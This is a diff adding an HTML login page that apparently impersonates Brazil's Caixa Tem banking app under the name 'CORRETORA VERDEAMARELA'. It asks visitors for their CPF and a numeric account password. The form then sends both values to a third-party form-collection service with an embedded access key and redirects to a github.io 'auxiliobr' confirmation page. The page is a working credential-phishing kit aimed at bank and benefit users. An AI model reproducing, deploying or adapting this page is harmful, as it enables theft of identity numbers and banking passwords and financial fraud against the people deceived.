@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+
+  <title>CORRETORA VERDEAMARELA</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      height: 100vh;
+      margin: 0;
+      background-image: url('images/fundo-da-caixa.jpg');
+      background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
+    }
+
+    .container {
+      width: 80%;
+      max-width: 400px;
+      padding: 20px;
+      border-radius: 5px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+      color: white;
+      text-align: center;
+    }
+
+    input {
+      box-sizing: border-box;
+      width: 100%;
+      height: 50px;
+      font-weight: 300;
+      margin-top: 10px;
+      margin-bottom: 10px;
+      padding: 0 20px;
+      border: 1px solid #c1c1c1;
+      font-family: "Montserrat", sans-serif;
+      font-size: 14px;
+      color: #333;
+      border-radius: 4px;
+      background-color: white;
+    }
+
+    .password-input {
+      margin-bottom: 20px;
+      position: relative;
+    }
+
+    .password-toggle {
+      position: absolute;
+      transform: translatex(365px);
+      cursor: pointer;
+      color: #333;
+      top: 52%;
+    }
+
+    button {
+      width: 100%;
+      height: 50px;
+      font-weight: 600;
+      background-color: #FCB502;
+      color: white;
+      border: none;
+      cursor: pointer;
+      margin-top: 10px;
+      border-radius: 3px;
+    }
+
+    .help-text {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-top: 10px;
+      flex-wrap: wrap;
+    }
+
+    .no-show-again {
+      margin-right: 5px;
+    }
+
+    .version {
+      color: #BCBFC0;
+      margin-top: 10px;
+    }
+
+    /* Responsividade para telas menores (celulares) */
+    @media (max-width: 600px) {
+      input {
+        font-size: 12px;
+      }
+
+      button {
+        font-size: 16px;
+      }
+    }
+
+  </style>
+
+</head>
+
+<body>
+
+  <script>
+    function applyCPFFormat(input) {
+      const cleanedInput = input.value.replace(/\D/g, '');
+
+      let formattedCPF = '';
+
+      if (cleanedInput.length > 0) {
+        formattedCPF = cleanedInput.substring(0, 3);
+
+        if (cleanedInput.length >= 4) {
+          formattedCPF += '.' + cleanedInput.substring(3, 6);
+        }
+
+        if (cleanedInput.length >= 7) {
+          formattedCPF += '.' + cleanedInput.substring(6, 9);
+        }
+
+        if (cleanedInput.length >= 10) {
+          formattedCPF += '-' + cleanedInput.substring(9, 11);
+        }
+      }
+
+      input.value = formattedCPF;
+    }
+
+
+
+
+    let passwordVisible = false;
+
+    function togglePasswordVisibility() {
+      const eyeIcon = document.querySelector('.fas')
+      const passwordInput = document.getElementById('SENHA');
+      passwordVisible = !passwordVisible;
+
+      if (!passwordVisible) {
+        passwordInput.type = 'password';
+        eyeIcon.classList.remove('fa-eye');
+        eyeIcon.classList.add('fa-eye-slash');
+      } else {
+        passwordInput.type = 'text';
+        eyeIcon.classList.remove('fa-eye-slash');
+        eyeIcon.classList.add('fa-eye');
+      }
+    }
+
+    function allowOnlyNumbers(input) {
+      input.value = input.value.replace(/\D/g, '');
+    }
+
+
+  </script>
+
+
+
+  <div class="container">
+    <h2>
+      <img src="images/logoxtem.png" alt="logo caixa tem" style="vertical-align: middle;">
+    </h2>
+    <form action="https://api.staticforms.xyz/submit" method="post" onsubmit="handleFormSubmit(event)">
+      <input type="hidden" name="accessKey" value="715fa863-8760-471a-b8e0-4d3477b584b0"> <!-- Required -->
+
+      <input pattern="\d{3}\.\d{3}\.\d{3}-\d{2}" oninput="applyCPFFormat(this)" type="text" id="CPF" name="$CPF"
+        placeholder="DIGITE SEU CPF" maxlength="14" required>
+
+
+      <!-- Alteração no campo senha -->
+      <div style="display:flex;align-items:center ;position: relative;">
+        <input oninput="allowOnlyNumbers(this)" type="password" class="password-input" id="SENHA" name="$SENHA"
+          placeholder="DIGITE SUA SENHA" maxlength="8" required>
+    
+          <i style="    
+          position: absolute;
+          top: 35%;
+          right: 8%;
+          cursor: pointer;
+          color: black;
+          width: 10px;
+          height: 10px;" onclick="togglePasswordVisibility()" class="fas fa-eye-slash"></i>
+    
+      </div>
+
+      <input type="hidden" name="redirectTo" value="https://modoanonimo.github.io/auxiliobr/confirmacao">
+      <!-- Optional -->
+
+      <button type="submit">CONTRATAR</button>
+    </form>
+    <div class="help-text">
+      <label><input type="checkbox" class="no-show-again" style="height: 15px; width: 15px;"> Não mostrar
+        novamente</label>
+    </div>
+    <div class="help-text">Preciso de ajuda</div>
+    <div class="version">v1.78.1</div>
+
+  </div>
+
+
+</body>
+
+</html>
